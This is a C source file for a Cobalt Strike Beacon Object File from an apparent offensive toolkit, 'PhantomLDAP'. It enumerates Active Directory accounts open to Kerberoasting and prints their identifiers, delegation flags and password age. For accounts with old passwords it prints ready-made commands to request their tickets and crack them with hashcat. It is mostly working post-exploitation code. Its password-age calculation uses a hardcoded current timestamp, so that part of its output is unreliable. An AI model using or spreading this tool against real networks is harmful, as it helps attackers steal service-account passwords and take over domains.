/**
 * @file enum_spn.c
 * @brief PhantomLDAP BOF — Enumerate Kerberoastable accounts (SPN holders).
 *
 * Searches Active Directory for enabled user accounts that have at least one
 * Service Principal Name (SPN) registered. Such accounts have Kerberos TGS
 * tickets that can be requested by any authenticated domain user, then
 * cracked offline to recover the account's plaintext password.
 *
 * LDAP Filter:
 *   (&(objectCategory=person)(objectClass=user)
 *     (servicePrincipalName=*)
 *     (!(userAccountControl:1.2.840.113556.1.4.803:=2)))
 *
 * Arguments (CNA bof_pack):
 *   [Z] dc_name - Optional DC hostname (wide string, empty = auto)
 *
 * @author  PhantomLDAP Project
 * @version 1.0.0
 */

#include "../../include/phantom_ldap.h"

#define MODULE_TAG   "SPN-ENUM"
#define MODULE_TITLE "Kerberoastable Account Discovery (SPN Enumeration)"

static PWSTR g_attrs[] = {
    L"sAMAccountName",
    L"distinguishedName",
    L"servicePrincipalName",
    L"userAccountControl",
    L"pwdLastSet",
    L"lastLogon",
    L"description",
    L"objectSid",
    NULL
};

/* Service type counter for summary */
typedef struct {
    DWORD mssql;
    DWORD http;
    DWORD host;
    DWORD cifs;
    DWORD ldap;
    DWORD other;
    DWORD total_spns;
} SPN_STATS;

static SPN_STATS g_stats = {0};

/** Identify the service type from an SPN string (e.g., "MSSQLSvc/...") */
static const char *classify_spn(const char *spn) {
    /* Manual prefix match — no strncasecmp available */
    if (spn[0]=='M'&&spn[1]=='S'&&spn[2]=='S'&&spn[3]=='Q'&&spn[4]=='L') return "MSSQL";
    if (spn[0]=='H'&&spn[1]=='T'&&spn[2]=='T'&&spn[3]=='P')               return "HTTP";
    if (spn[0]=='h'&&spn[1]=='t'&&spn[2]=='t'&&spn[3]=='p')               return "HTTP";
    if (spn[0]=='H'&&spn[1]=='O'&&spn[2]=='S'&&spn[3]=='T')               return "HOST";
    if (spn[0]=='h'&&spn[1]=='o'&&spn[2]=='s'&&spn[3]=='t')               return "HOST";
    if (spn[0]=='C'&&spn[1]=='I'&&spn[2]=='F'&&spn[3]=='S')               return "CIFS";
    if (spn[0]=='c'&&spn[1]=='i'&&spn[2]=='f'&&spn[3]=='s')               return "CIFS";
    if (spn[0]=='L'&&spn[1]=='D'&&spn[2]=='A'&&spn[3]=='P')               return "LDAP";
    if (spn[0]=='l'&&spn[1]=='d'&&spn[2]=='a'&&spn[3]=='p')               return "LDAP";
    if (spn[0]=='E'&&spn[1]=='x'&&spn[2]=='c'&&spn[3]=='h')               return "Exchange";
    if (spn[0]=='G'&&spn[1]=='C'&&spn[2]=='/')                             return "GlobalCatalog";
    return "Other";
}

static BOOL enum_spn_callback(PPHANTOM_CONTEXT ctx, PLDAPMessage entry, PVOID user_data) {
    (void)user_data;
    PPHANTOM_LDAP_API api = &ctx->api;

    PWSTR *sam_vals   = NULL;
    PWSTR *dn_vals    = NULL;
    PWSTR *spn_vals   = NULL;
    PWSTR *uac_vals   = NULL;
    PWSTR *pwd_vals   = NULL;
    PWSTR *logon_vals = NULL;
    PLDAP_BERVAL *sid_vals = NULL;

    char sam_str[128]  = {0};
    char dn_str[512]   = {0};
    char uac_str[256]  = {0};
    char pwd_str[48]   = {0};
    char pwd_age[48]   = {0};
    char sid_str[185]  = {0};

    ctx->total_found++;

    sam_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_SAM_ACCOUNT_NAME);
    if (sam_vals && sam_vals[0]) phantom_wstr_to_str(sam_vals[0], sam_str, sizeof(sam_str));

    dn_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_DISTINGUISHED_NAME);
    if (dn_vals && dn_vals[0]) phantom_wstr_to_str(dn_vals[0], dn_str, sizeof(dn_str));

    DWORD uac_val = 0;
    uac_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_USER_ACCOUNT_CTRL);
    if (uac_vals && uac_vals[0]) {
        PWSTR w = uac_vals[0];
        while (*w >= L'0' && *w <= L'9') { uac_val = uac_val * 10 + (DWORD)(*w - L'0'); w++; }
        phantom_decode_uac(uac_val, uac_str, sizeof(uac_str));
    }

    LONGLONG pwd_ft = 0;
    pwd_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_PWD_LAST_SET);
    if (pwd_vals && pwd_vals[0]) {
        PWSTR w = pwd_vals[0];
        while (*w >= L'0' && *w <= L'9') { pwd_ft = pwd_ft * 10 + (LONGLONG)(*w - L'0'); w++; }
        phantom_filetime_to_str(pwd_ft, pwd_str, sizeof(pwd_str));
        phantom_filetime_to_age(pwd_ft, pwd_age, sizeof(pwd_age));
    }

    sid_vals = api->ldap_get_values_len(ctx->ldap_handle, entry, ATTR_OBJECT_SID);
    if (sid_vals && sid_vals[0])
        phantom_sid_to_string((BYTE *)sid_vals[0]->bv_val,
                              (DWORD)sid_vals[0]->bv_len, sid_str, sizeof(sid_str));

    /* Header */
    phantom_print_separator('-');
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Kerberoastable #%lu: %s\n",
                 (unsigned long)ctx->total_found, sam_str);
    phantom_print_kv("DN",  dn_str, 4);
    phantom_print_kv("UAC", uac_str, 4);

    if (sid_str[0]) phantom_print_kv("SID", sid_str, 4);

    /* SPNs */
    spn_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_SPN);
    if (spn_vals) {
        ULONG count = api->ldap_count_values(spn_vals);
        g_stats.total_spns += count;
        BeaconPrintf(CALLBACK_OUTPUT, "      %-26s: (%lu SPN(s))\n", "SPN(s)", (unsigned long)count);
        for (ULONG i = 0; i < count && i < PHANTOM_MAX_SPN_DISPLAY; i++) {
            char spn[256] = {0};
            phantom_wstr_to_str(spn_vals[i], spn, sizeof(spn));
            const char *svc = classify_spn(spn);
            BeaconPrintf(CALLBACK_OUTPUT, "                                  [%s] %s\n", svc, spn);
            /* Tally service types */
            if (svc[0]=='M') g_stats.mssql++;
            else if (svc[0]=='H'&&svc[1]=='T') g_stats.http++;
            else if (svc[0]=='H'&&svc[1]=='O') g_stats.host++;
            else if (svc[0]=='C') g_stats.cifs++;
            else if (svc[0]=='L') g_stats.ldap++;
            else g_stats.other++;
        }
        if (count > PHANTOM_MAX_SPN_DISPLAY)
            BeaconPrintf(CALLBACK_OUTPUT, "                                  ... and %lu more\n",
                         (unsigned long)(count - PHANTOM_MAX_SPN_DISPLAY));
    }

    /* Password age */
    if (pwd_ft == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "      %-26s: NEVER SET\n", "Pwd Set");
    } else {
        unsigned long long ft_unix = (unsigned long long)(pwd_ft - 116444736000000000LL) / 10000000ULL;
        unsigned long long days_old = (1750000000ULL > ft_unix) ? (1750000000ULL - ft_unix) / 86400ULL : 0;
        BeaconPrintf(CALLBACK_OUTPUT, "      %-26s: %s (%s)\n", "Pwd Set", pwd_str, pwd_age);
        if (days_old > 365)
            BeaconPrintf(CALLBACK_OUTPUT,
                "    [!] OLD PASSWORD: %lu days — HIGH cracking probability!\n"
                "    [*] Attack: GetUserSPNs.py %ls/ -request -outputfile hashes.txt\n"
                "    [*] Crack:  hashcat -m 13100 hashes.txt wordlist.txt\n",
                (unsigned long)days_old, ctx->base_dn);
    }

    /* Delegation warnings */
    if (uac_val & UAC_TRUSTED_FOR_DELEGATION)
        BeaconPrintf(CALLBACK_OUTPUT,
            "    [!] UNCONSTRAINED DELEGATION — crack this account for domain compromise!\n");
    if (uac_val & UAC_TRUSTED_TO_AUTH_FOR_DELEGATION)
        BeaconPrintf(CALLBACK_OUTPUT,
            "    [!] CONSTRAINED DELEGATION (S4U2Proxy) — potential impersonation path\n");

cleanup:
    if (sam_vals)   api->ldap_value_free(sam_vals);
    if (dn_vals)    api->ldap_value_free(dn_vals);
    if (spn_vals)   api->ldap_value_free(spn_vals);
    if (uac_vals)   api->ldap_value_free(uac_vals);
    if (pwd_vals)   api->ldap_value_free(pwd_vals);
    if (logon_vals) api->ldap_value_free(logon_vals);
    if (sid_vals)   api->ldap_value_free_len(sid_vals);

    return TRUE;
}

void go(char *args, int len) {
    PHANTOM_CONTEXT ctx    = {0};
    datap           parser = {0};
    WCHAR           dc_name[256] = {0};
    char           *dc_arg = NULL;
    int             dc_len  = 0;

    BeaconDataParse(&parser, args, len);
    dc_arg = BeaconDataExtract(&parser, &dc_len);
    if (dc_arg && dc_len > 0 && dc_arg[0] != '\0')
        for (int i = 0; i < dc_len && i < 255; i++)
            dc_name[i] = (WCHAR)(unsigned char)dc_arg[i];

    phantom_print_banner();
    phantom_print_header(MODULE_TITLE, MODULE_TAG);

    if (!phantom_ldap_init(&ctx, dc_name[0] ? dc_name : NULL, FALSE, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] PhantomLDAP: LDAP init failed.\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Filter  : %ls\n"
        "[*] Base DN : %ls\n\n",
        FILTER_SPN_ACCOUNTS, ctx.base_dn);

    phantom_ldap_paged_search(&ctx, ctx.base_dn, LDAP_SCOPE_SUBTREE,
                               FILTER_SPN_ACCOUNTS, g_attrs,
                               enum_spn_callback, NULL);

    if (ctx.total_found == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No Kerberoastable accounts found.\n");
    } else {
        phantom_print_separator('=');
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] SPN Service Distribution:\n"
            "    MSSQLSvc      : %lu\n"
            "    HTTP/HTTPS    : %lu\n"
            "    HOST          : %lu\n"
            "    CIFS/SMB      : %lu\n"
            "    LDAP          : %lu\n"
            "    Other         : %lu\n"
            "    Total SPNs    : %lu\n",
            (unsigned long)g_stats.mssql,
            (unsigned long)g_stats.http,
            (unsigned long)g_stats.host,
            (unsigned long)g_stats.cifs,
            (unsigned long)g_stats.ldap,
            (unsigned long)g_stats.other,
            (unsigned long)g_stats.total_spns);
    }

    phantom_print_footer(&ctx);

cleanup:
    phantom_ldap_cleanup(&ctx);
}
